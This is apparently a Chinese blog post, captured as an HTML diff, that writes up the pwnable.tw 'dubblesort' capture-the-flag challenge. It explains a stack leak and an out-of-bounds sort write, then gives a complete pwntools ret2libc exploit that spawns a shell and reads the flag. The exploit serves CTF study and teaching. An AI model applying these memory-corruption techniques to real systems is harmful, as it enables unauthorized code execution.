@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="程序分析题目地址https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#4这道题目是一个冒泡排序的小程序，主要流程是这样的 12345678910111213141516171819202122y11en@ubuntu:~&#x2F;Desktop&#x2F;ctf&#x2F;pwnable.tw$ .&#x2F;dubblesort What your name :nottellyouHello nottellyou,How ma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw-dubblesort">
+<meta property="og:url" content="https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/index.html">
+<meta property="og:site_name" content="Y11en">
+<meta property="og:description" content="程序分析题目地址https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#4这道题目是一个冒泡排序的小程序，主要流程是这样的 12345678910111213141516171819202122y11en@ubuntu:~&#x2F;Desktop&#x2F;ctf&#x2F;pwnable.tw$ .&#x2F;dubblesort What your name :nottellyouHello nottellyou,How ma">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-13T13:41:21.000Z">
+<meta property="article:modified_time" content="2017-12-13T14:49:20.492Z">
+<meta property="article:author" content="Y11en">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>pwnable.tw-dubblesort</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/01/13/%E2%80%9C%E6%9D%9F%E5%8F%91%E5%B0%91%E5%B9%B4%E2%80%9DEQNEDT32%E7%9A%84%E9%99%A8%E8%90%BD/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/12/10/pwnable-tw-calc/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&text=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&is_video=false&description=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw-dubblesort&body=Check out this article: https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&title=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&name=pwnable.tw-dubblesort&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y11en.github.io/2017/12/13/pwnable-tw-dubblesort/&t=pwnable.tw-dubblesort" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题1"><span class="toc-number">1.1.</span> <span class="toc-text">问题1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问题2"><span class="toc-number">1.2.</span> <span class="toc-text">问题2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#栈数据泄露"><span class="toc-number">2.1.</span> <span class="toc-text">栈数据泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#栈数据覆盖"><span class="toc-number">2.2.</span> <span class="toc-text">栈数据覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc基址获取"><span class="toc-number">2.3.</span> <span class="toc-text">libc基址获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用思路"><span class="toc-number">2.4.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#坑在哪？"><span class="toc-number">2.5.</span> <span class="toc-text">坑在哪？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwnable.tw-dubblesort
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Y11en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-12-13T13:41:21.000Z" itemprop="datePublished">2017-12-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>题目地址<code>https://pwnable.tw/challenge/#4</code><br>这道题目是一个冒泡排序的小程序，主要流程是这样的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./dubblesort </span><br><span class="line">What your name :nottellyou</span><br><span class="line">Hello nottellyou</span><br><span class="line">,How many numbers <span class="keyword">do</span> you what to sort :4</span><br><span class="line">Enter the 0 number : 6</span><br><span class="line">Enter the 1 number : 7</span><br><span class="line">Enter the 2 number : 1</span><br><span class="line">Enter the 3 number : 2</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">1 2 6 7 </span><br><span class="line"></span><br><span class="line"><span class="comment">### 检查下保护</span></span><br><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ checksec dubblesort </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[*] <span class="string">'/home/y11en/Desktop/ctf/pwnable.tw/dubblesort'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>题目有2处输入，一处是输入name，另一处是输入排序数组的信息项数和项信息。</p>
+<h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>在name输入的地方，由于没有初始化栈数据，导致打印name时后面栈上数据被泄露</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> name[<span class="number">16</span>]; <span class="comment">// [esp+3Ch] [ebp-50h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">v12 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">sub_8B5();</span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>, v8);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, name, <span class="number">0x40</span>u);                         <span class="comment">// 未初始化内存</span></span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>, (<span class="keyword">int</span>)name);</span><br></pre></td></tr></table></figure>
+<h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>在输入待排序项时，只有8个元素的的数组作为缓存，而实际待排序个数由用户输入 ,当这个大小 &gt;8时，打印栈后数据，当然在其排序逻辑中，可以越界写数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> v10[<span class="number">8</span>]; <span class="comment">// [esp+1Ch] [ebp-70h]</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;numcount);</span><br><span class="line">  idx = numcount;</span><br><span class="line">  <span class="keyword">if</span> ( numcount )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v10;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>, v5);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)v4);       <span class="comment">// 输入非数字导致该函数不执行实际功能</span></span><br><span class="line">      ++v5;</span><br><span class="line">      idx = numcount;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( numcount &gt; v5 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h3><p><code>scanf(&quot;%u&quot;,&amp;x)</code> 中%u是输入无符号整型的格式符。<br>为了保证只覆盖需要的数据(跳过stack cookie)，我们需要知道在%u的格式符下，输入除去数字外的字符时不会被接收(不产生赋值操作)，但只输入”+””-“可以被接收并且不产生赋值操作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./dubblesort </span><br><span class="line">What your name :a</span><br><span class="line">Hello a</span><br><span class="line">,How many numbers <span class="keyword">do</span> you what to sort :3</span><br><span class="line">Enter the 0 number : 0</span><br><span class="line">Enter the 1 number : +</span><br><span class="line">Enter the 2 number : 0</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">0 0 3217242607 y11en@ubuntu:~/Desktop/ctf/pwnable.tw$</span><br></pre></td></tr></table></figure>
+<h3 id="栈数据覆盖"><a href="#栈数据覆盖" class="headerlink" title="栈数据覆盖"></a>栈数据覆盖</h3><p>由于不会被接收，所以字母类型的会一直在输入缓冲区放着，导致后面的也会不接收，造成程序唰唰唰的执行到底，这就无法满足我们想跳过前面1个覆盖第2个的需要，而“+”,“-”可以!<br>既然可以控制排序数组的边界，那么我们尝试输入一个超过其缓冲大小的值，使程序越界排序(按值由小到大排序),当然排序的不是目的，覆盖关键数据才是目的，为了劫持程序流程，通过覆盖返回地址的方式，同时保证stack cookie的值不会被改，构造如下数据:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  让 v10到cookie的值全部为0，为0的目的是保证排序时不干扰后面的值</span><br><span class="line">2.  让cookie的值不变，也即输入+或者-</span><br><span class="line">3.  覆盖返回地址</span><br></pre></td></tr></table></figure>
+<h3 id="libc基址获取"><a href="#libc基址获取" class="headerlink" title="libc基址获取"></a>libc基址获取</h3><ul>
+<li><p>方式一<br>通过获取程序主函数的返回地址，可以计算得到 __libc_start_main 的地址，由于提供了so文件，我们可以换算得到基址，但这就使得我们需要让程序的返回地址依然返回的程序主流程中，但这个貌似比较难，首先你得知道程序入口地址实际是什么</p>
+</li>
+<li><p>方式二<br>通过调试，我们可以发现在name的后面有一个存在libc中的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20wx 0xbfffefdc</span><br><span class="line">0xbfffefdc:	0x0000fec7	0xbffff2ab	0x0000002f	0x0000009e</span><br><span class="line">0xbfffefec:	0x00000016	0x00008000	[0xb7fbb000]0xb7fb9244</span><br><span class="line">0xbfffeffc:	0x80000601	0x800007a9	0x80001fa0	0x00000001</span><br><span class="line">0xbffff00c:	0x80000b72	0x00000001	0xbffff0d4	0xbffff0dc</span><br><span class="line">0xbffff01c:	0x84cb9400	0xb7fbb3dc	0xbffff29b	0x80000b2b</span><br></pre></td></tr></table></figure>
+<p>通过<code>vmmap 命令</code>在调试时查看libc的实际地址是 <code>0xb7e09000,</code>，相差<code>0x1b2000</code>，再通过readelf -S 看看本机libc这个地址是什么，再反查目标机器的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                                        addr   off  size</span><br><span class="line">...</span><br><span class="line">本机</span><br><span class="line">[32] .got.plt          PROGBITS        001b2000 1b1000 000030 04  WA  0   0  4</span><br><span class="line">目标机器</span><br><span class="line">[31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>对比目标、目标机器的libc，可以得到如下计算目标libc基地址公式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc &#x3D; leakaddr - 0x01b0000</span><br></pre></td></tr></table></figure>
+<p>知道这个了，通过构造大小为24非\x00字符以及，利用输入时自带的\n，覆盖掉leakaddr的低位，最后在取值时进行处理即可。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3></li>
+</ul>
+<ol>
+<li>泄露libc地址</li>
+<li>找到system, binsh地址</li>
+<li>通过排序设置返回地址</li>
+</ol>
+<h3 id="坑在哪？"><a href="#坑在哪？" class="headerlink" title="坑在哪？"></a>坑在哪？</h3><p>这个题目的栈空间是一个比较坑的地方。<br>在布置栈分布时候，发现我们覆盖的返回地址与实际的返回地址存在偏差，而且通过数次的测试发现这个值有时会变，苦思冥想了很久，一开始以为是如下的主函数结束代码导致的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>10 loc_B10:                                ; CODE XREF: main+<span class="number">146</span>↑j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>10                 lea     esp, [ebp<span class="number">-0</span>Ch]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>13                 pop     ebx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>14                 pop     esi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>15                 pop     edi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>16                 pop     ebp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>17                 retn</span><br></pre></td></tr></table></figure>
+<p>但是，经过我一而再再而三的计算，发现并不是，因为这个栈的空间就是这样平着的，最后发现是函数开头的时候，对esp进行了对齐操作，这样在很大情况下，使得esp会丢失掉部分字节，而ida不知道啊，这也和上面不常见的<code>lea     esp, [ebp-0Ch]</code>进行了对照。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C3                 push    ebp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C4                 mov     ebp, esp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C6                 push    edi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C7                 push    esi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C8                 push    ebx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C9                 <span class="keyword">and</span>     esp, <span class="number">0F</span>FFFFFF0h ; 这个 真的 我f*ck</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>CC                 add     esp, <span class="number">0F</span>FFFFF80h</span><br></pre></td></tr></table></figure>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>最终的利用代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">printf_plt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCALFILE = <span class="string">'./dubblesort'</span></span><br><span class="line">HOST = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">PORT = <span class="number">10101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	p = process(LOCALFILE)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_me_system_binsh</span><span class="params">(libc_base , libso)</span>:</span></span><br><span class="line">	libc=ELF(libso)</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">	binsh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">	<span class="keyword">return</span> system_addr , binsh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">"What your name :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"AAAA"</span>*<span class="number">6</span>)</span><br><span class="line">	buf = p.recvuntil(<span class="string">"do you what to sort :"</span>).split(<span class="string">","</span>)[<span class="number">0</span>]</span><br><span class="line">	b = buf.split(<span class="string">'\n'</span>)[<span class="number">1</span>]	</span><br><span class="line">	libaddr = u32(<span class="string">"\x00"</span>+b[:<span class="number">3</span>])</span><br><span class="line">	<span class="keyword">if</span> DEBUG:</span><br><span class="line">		libaddr -= <span class="number">0x1b2000</span>	<span class="comment">#fix</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libaddr -= <span class="number">0x1b0000</span>	<span class="comment">#fix</span></span><br><span class="line">	<span class="keyword">print</span> (hex(libaddr))</span><br><span class="line">	<span class="keyword">return</span> libaddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dubblesort</span><span class="params">(system_addr , binsh)</span>:</span></span><br><span class="line">	<span class="comment">#能不能pwn看脸</span></span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"[+] dubblesort &gt;&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"36"</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">36</span>):</span><br><span class="line">		<span class="keyword">print</span> (p.recvuntil(<span class="string">"number : "</span>))</span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">24</span> : d = <span class="string">"+"</span></span><br><span class="line">		<span class="keyword">elif</span> i&gt;=<span class="number">25</span> <span class="keyword">and</span> i &lt;= <span class="number">33</span>: </span><br><span class="line">			<span class="keyword">if</span> i == <span class="number">28</span>:</span><br><span class="line">				d = <span class="string">"+"</span>	<span class="comment"># +</span></span><br><span class="line">			<span class="keyword">if</span> i == <span class="number">29</span>:</span><br><span class="line">				d = str(system_addr)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				d = str(system_addr)	<span class="comment">#system_addr		</span></span><br><span class="line">		<span class="keyword">elif</span> i == <span class="number">34</span> <span class="keyword">or</span> i == <span class="number">35</span>: d= str(binsh)	<span class="comment">#binsh</span></span><br><span class="line">		<span class="keyword">else</span>: d = <span class="string">"0"</span></span><br><span class="line">		print(d)</span><br><span class="line">		p.sendline(d)</span><br><span class="line">	p.recvuntil(<span class="string">"Processing......"</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	time.sleep(<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">print</span> (p.recvuntil(<span class="string">"Result :"</span>))</span><br><span class="line">	<span class="keyword">print</span> (p.recv())</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"[+] dubblesort &lt;&lt;&lt;"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	libc = leaklibc()</span><br><span class="line">	<span class="keyword">if</span> DEBUG:</span><br><span class="line">		s , sh = give_me_system_binsh(libc , <span class="string">"/lib/i386-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s , sh = give_me_system_binsh(libc , <span class="string">"./libc_32.so_dubblesort.6"</span>)</span><br><span class="line">	<span class="keyword">print</span> ((s) , (sh))	</span><br><span class="line">	dubblesort(s,sh)</span><br><span class="line">	p.sendline(<span class="string">'cat /home/dubblesort/flag'</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
